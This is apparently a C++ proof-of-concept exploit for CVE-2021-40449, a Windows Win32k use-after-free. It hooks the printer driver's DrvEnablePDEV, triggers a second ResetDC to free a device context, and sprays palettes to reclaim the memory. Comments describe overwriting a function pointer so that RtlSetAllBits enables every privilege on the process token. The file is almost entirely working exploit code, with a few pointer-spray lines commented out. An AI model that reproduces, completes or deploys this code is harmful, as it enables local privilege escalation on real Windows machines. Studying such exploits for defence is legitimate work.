#include "include/core/poc.hpp"
using namespace CVE_2021_40449;
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_40449
{


    VOID SprayPalettes(DWORD size)
    {
        /* Spray palettes to reclaim freed memory */

        DWORD palCount = (size - 0x90) / 4;
        DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
        LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);

        if (lPalette == NULL) {
            puts("[-] Failed to create palette");
            return;
        }

        DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);

        // Will call: RtlSetAllBits(BitMapHeader), where BitMapHeader is a forged
        // to point to the current process token (See `CreateForgedBitMapHeader`)
        // This will enable all privileges

        // Offset is specific to each version. Spray the two pointers
        // Arg1 (BitMapHeader)
        // for (DWORD i = 0; i < 0x120; i++) {
        //     p[i] = globals::fakeRtlBitMapAddr;
        //     // p[0xe5] = globals::fakeRtlBitMapAddr;
        // }

        // Function pointer (RtlSetAllBits)
        // for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) {
        //     p[i] = globals::rtlSetAllBits;
        //     // p[0x15b] = globals::rtlSetAllBits;
        // }


        lPalette->palNumEntries = (WORD)palCount;
        lPalette->palVersion = 0x300;

        // Create lots of palettes
        for (DWORD i = 0; i < 0x5000; i++)
        {
            CreatePalette(lPalette);
        }
    }

    DHPDEV hook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver) {
        puts("[*] Hooked DrvEnablePDEV called");

        DHPDEV res = oldFuncPtr(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

        // Check if we should trigger the vulnerability
        if (trigger == TRUE)
        {
            // We only want to trigger the vulnerability once
            trigger = FALSE;

            // Trigger vulnerability with second ResetDC. This will destroy the original
            // device context, while we're still inside of the first ResetDC. This will
            // result in a UAF
            puts("[*] Triggering UAF with second ResetDC");
            HDC tmp_hdc = ResetDCW(pocHDC, NULL);
            getchar();  // DEBUG_B

            puts("[*] Returned from second ResetDC");

            // This is where we reclaim the freed memory and overwrite the function pointer
            // and argument. We will use palettes to reclaim the freed memory

            puts("[*] Spraying palettes");

            SprayPalettes(0xe20);

            puts("[*] Done spraying palettes");
        }

        return res;
    }
    bool PoC() {

        printf("PoC pid: 0x%X\n", GetCurrentProcessId());
        if (!initAPI())
            return false;
        getchar(); // DEBUG_A
        findPrinters(hook_DrvEnablePDEV);
        pocHDC = CreateDCW(NULL, printerName, NULL, NULL);
        trigger = true;
        ResetDC(pocHDC, NULL);
        return true;
    }


} // namespace CVE_2021_40449